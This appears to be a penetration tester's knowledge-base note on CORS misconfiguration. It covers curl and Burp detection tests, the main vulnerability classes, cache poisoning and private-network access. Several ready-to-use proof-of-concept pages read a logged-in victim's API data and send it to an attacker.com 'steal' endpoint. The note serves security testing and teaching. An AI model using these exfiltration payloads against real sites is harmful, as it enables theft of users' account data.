# CORS Misconfiguration

#CORS #WebAppAttacks #BrokenAccessControl #APIAttacks #CachePoisoning #DNSRebinding #BurpSuite #cURL

## What is this?

Cross-Origin Resource Sharing misconfiguration allowing attacker-controlled origins to read authenticated responses via a victim's browser. CORS is browser-enforced only — curl/Burp ignore it. Pairs with [[Web Attacks]], [[Cross-Site Scripting (XSS)]], [[CSRF Attacks]].

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Web/Burpsuite\|Burp Suite]] | Test Origin header reflection, craft PoC HTML pages via Repeater |
| [[Tools/File Transfer/cURL\|curl]] | Manual origin testing (`-H "Origin: https://evil.com"`) |
| Browser DevTools | Observe CORS errors in console, inspect preflight responses |
| [CORScanner](https://github.com/chenjj/CORScanner) | Bulk-scan a host list for the common misconfiguration classes |

---

## How CORS Works

```bash
Browser sends:    Origin: https://attacker.com
Server responds:  Access-Control-Allow-Origin: https://attacker.com
                  Access-Control-Allow-Credentials: true

→ Browser allows attacker.com JS to read the response
```

Without `Access-Control-Allow-Credentials: true`, cookies are not sent — the response is cross-origin but unauthenticated.

---

## Detection

```bash
# Test 1: Reflect arbitrary origin
curl -s -I "https://<target>/api/profile" -H "Origin: https://evil.com" -H "Cookie: session=<valid-session>"
# Look for: Access-Control-Allow-Origin: https://evil.com
# AND:       Access-Control-Allow-Credentials: true

# Test 2: Null origin
curl -s -I "https://<target>/api/profile" -H "Origin: null" -H "Cookie: session=<valid-session>"
# Look for: Access-Control-Allow-Origin: null

# Test 3: Prefix/suffix match bypass
curl -s -I "https://<target>/api/profile" -H "Origin: https://evil-target.com" -H "Cookie: session=<valid-session>"
# If ACAO: https://evil-target.com → ends-with check bypass

curl -s -I "https://<target>/api/profile" -H "Origin: https://target.com.evil.com" -H "Cookie: session=<valid-session>"
# If ACAO: https://target.com.evil.com → prefix check bypass

# Test 4: Subdomain trust
curl -s -I "https://<target>/api/profile" -H "Origin: https://subdomain.target.com" -H "Cookie: session=<valid-session>"
# If ACAO: https://subdomain.target.com → find XSS on any subdomain

# Test 5: HTTP downgrade
curl -s -I "https://<target>/api/profile" -H "Origin: http://target.com" -H "Cookie: session=<valid-session>"

# Test 6: Preflighted check (non-simple requests)
curl -s -I "https://<target>/api/admin" -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Headers: Authorization"
# Look for: Access-Control-Allow-Methods, Access-Control-Allow-Headers
```

---

## Vulnerability Classes

### 1. Wildcard with Credentials

```bash
# Server responds: ACAO: *  AND  ACAC: true
# Actually invalid per spec — but some frameworks mishandle this
curl -si "https://<target>/api/data" -H "Origin: https://evil.com" | grep -i "access-control"
# If ACAO: * → wildcard (no credentials sent)
# If ACAO: * + ACAC: true → misconfig (browser blocks per spec, but check anyway)
```

### 2. Origin Reflected Verbatim

```bash
# Server echoes back whatever Origin header is sent
curl -si "https://<target>/api/profile" -H "Origin: https://evil.com" -b "session=<cookie>" | grep -i "access-control"
# ACAO: https://evil.com + ACAC: true → fully exploitable
```

### 3. Null Origin Trusted

```bash
curl -si "https://<target>/api/profile" -H "Origin: null" -b "session=<cookie>" | grep -i "access-control"
# ACAO: null + ACAC: true → sandbox iframe exploit (see below)
```

> [!note] What produces a null origin, which `sandbox` tokens keep it, and the other sinks that trust `null` (CSRF, WebSocket handshake, `postMessage`) are covered in [[Null Origin Attacks]].

### 4. Regex Bypass — Suffix Match

```bash
# Server checks if origin ends with "target.com"
# Bypass: register a domain ending in target.com
curl -si "https://<target>/api/profile" -H "Origin: https://eviltarget.com" -b "session=<cookie>" | grep -i "access-control"
# OR: https://notatarget.com
```

### 5. Simple Request — Preflight Bypass

Browsers only send a preflight OPTIONS request for "non-simple" requests. **Simple requests skip preflight entirely** and are sent directly, which means the CORS check happens on the actual response headers — not a preliminary OPTIONS.

**Simple requests (no preflight):**
- Methods: `GET`, `POST`, `HEAD`
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
- No custom headers (no `Authorization`, no `X-Custom-Header`)

**Non-simple requests (preflight required):**
- Methods: `PUT`, `DELETE`, `PATCH`
- Content-Type: `application/json`
- Any custom header (`Authorization`, `X-API-Key`, etc.)

> [!tip] If an API accepts `GET` requests with sensitive data, the CORS vulnerability is directly exploitable without any OPTIONS preflight succeeding. Test simple GET endpoints separately — don't assume a blocked preflight means the endpoint is safe.

```bash
# Simple GET — no preflight, CORS headers on response determine exploitability
curl -si "https://<target>/api/userdata" -H "Origin: https://evil.com" -b "session=<cookie>" | grep -i "access-control"
```

### 6. Subdomain Trust + XSS

```bash
# Server trusts *.target.com
# Find XSS on any subdomain → exfil from main domain
# Test all subdomains found in recon for reflected/stored XSS
```

### 7. Missing `Vary: Origin` → CORS Cache Poisoning

When the server reflects the origin but omits `Vary: Origin`, any cache in front of it (CDN, reverse proxy) stores **one** response for the URL — including whichever `Access-Control-Allow-Origin` value was in it. Poison the cache with your origin and every subsequent victim gets a response that authorises `evil.com`.

```bash
# Confirm the origin is reflected AND Vary: Origin is absent
curl -si "https://<target>/api/profile" -H "Origin: https://evil.com" | grep -Ei "access-control-allow-origin|^vary"
# ACAO: https://evil.com  with no "Vary: Origin" line → cacheable misconfig

# Check whether the endpoint is actually cached (look for a cache status header)
curl -si "https://<target>/api/profile" -H "Origin: https://evil.com" | grep -Ei "x-cache|cf-cache-status|age:"
```

> [!note] Works in reverse too — a *victim*-origin response cached under an attacker-reachable key. The reflection alone is enough to report; caching just widens blast radius from "victim must visit my page" to "everyone hitting the CDN".

### 8. Private Network Access (`Access-Control-Allow-Private-Network`)

Chromium blocks public→private (RFC1918 / localhost) subresource requests unless the private server answers the preflight with `Access-Control-Allow-Private-Network: true`. A server that sets it — deliberately or via a framework default — lets **any** public web page reach an internal service through a victim's browser.

```bash
# Preflight a suspected internal service as a public page would
curl -si "http://192.168.1.1/api/status" -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Private-Network: true" \
  | grep -Ei "access-control-allow-(origin|private-network|credentials)"
# ACAPN: true + reflected ACAO → internal service reachable from the public web
```

| Finding | Why it matters |
|---|---|
| `Access-Control-Allow-Private-Network: true` on an internal app | Public page can read internal responses via the victim's browser |
| flask-cors `<= 4.0.1` (CVE-2024-6221) | Sets the header `true` by default — check the dependency, not just the response |
| Target audience uses Firefox | PNA still unenforced there (as of Firefox 148, Mar 2026) — the block doesn't apply |

> [!tip] Where PNA does block you, DNS rebinding sidesteps it entirely — the browser believes it never left the origin, so no preflight is required (see VU#652514). Chain it when a router/admin panel refuses the direct cross-origin read.

---

## Exploitation PoC

> [!warning] SameSite is the real gatekeeper. Every PoC below relies on `withCredentials`/`credentials:'include'` to attach the victim's session cookie — but modern browsers default cookies to **`SameSite=Lax`**, which blocks that cross-site cookie from being sent. These attacks land only when the session cookie is explicitly **`SameSite=None; Secure`** (common on APIs/SSO, less so elsewhere). Confirm the `Set-Cookie` attributes before assuming a reflected-origin misconfig is exploitable.

### Basic Reflected Origin Exploit

```html
<!-- Host on attacker.com, send link to victim -->
<!DOCTYPE html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/profile', true);
xhr.withCredentials = true;   // send victim's cookies
xhr.onload = function() {
  // Send stolen data to attacker server
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(this.responseText));
};
xhr.send();
</script>
</body>
</html>
```

```bash
# Serve the PoC
python3 -m http.server 8080
# Victim visits: http://<attacker-ip>:8080/cors.html while logged into target
```

### Null Origin (Sandboxed iframe)

The `sandbox` attribute drops the frame into an opaque origin — omitting `allow-same-origin` is what does it. Token reference and the navigation-based exfil variant in [[Null Origin Attacks#The `sandbox` Attribute]].

```html
<!-- null origin bypass — use sandboxed iframe -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','https://target.com/api/profile',true);
xhr.withCredentials=true;
xhr.onload=function(){
  top.location='https://attacker.com/steal?'+encodeURIComponent(this.responseText);
};
xhr.send();
</script>"></iframe>
```

### Fetch API Version (Modern)

```html
<script>
fetch('https://target.com/api/profile', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: data
  });
});
</script>
```

### Subdomain XSS → CORS Exfil

```javascript
// XSS payload on xss.target.com:
// Since origin is https://xss.target.com (trusted subdomain), CORS passes
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/admin', true);
xhr.withCredentials = true;
xhr.onload = function() {
  new Image().src = 'https://attacker.com/steal?d=' + encodeURIComponent(this.responseText);
};
xhr.send();
```

---

## CORS + Sensitive Endpoints

```bash
# Test CORS on high-value endpoints:
for endpoint in /api/profile /api/user /api/keys /api/tokens /api/admin /api/credentials /api/export; do
  echo -n "$endpoint: "
  curl -si "https://<target>$endpoint" -H "Origin: https://evil.com" -b "session=<cookie>" 2>/dev/null | grep -i "access-control-allow-origin" || echo "no CORS header"
done
```

---

## Burp Suite Testing

1. Proxy → HTTP History → find authenticated API request
2. Send to Repeater
3. Add `Origin: https://evil.com` header
4. Check response for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`
5. Burp Scanner → Active scan → checks for CORS issues automatically (Pro)

---

## Quick Reference

| Config | Credentials Sent | Exploitable |
|--------|-----------------|-------------|
| `ACAO: *` | No (browser blocks) | Read unauth responses only |
| `ACAO: *` + `ACAC: true` | Spec violation — browser blocks | Not exploitable |
| `ACAO: <origin>` + `ACAC: true` | Yes | **Fully exploitable** |
| `ACAO: null` + `ACAC: true` | Yes (via sandbox) | Exploitable |
| Server matches `*.target.com`, echoes the origin | Yes (subdomain) | Exploitable if XSS on any subdomain |
| Reflected `ACAO` with **no** `Vary: Origin` | Yes | Exploitable + cache-poisonable (widens to all users) |
| `Access-Control-Allow-Private-Network: true` | Yes | Internal/RFC1918 service reachable from any public page |

```bash
# One-liner check
curl -si "https://<target>/api/profile" -H "Origin: https://evil.com" -b "session=<cookie>" | grep -Ei "access-control-(allow-origin|allow-credentials)|^vary"
# Both headers present with arbitrary origin → exploitable
# No "Vary: Origin" alongside them → also cache-poisonable
```

---

*Created: 2026-03-04*
*Updated: 2026-08-23*
*Model: claude-opus-5*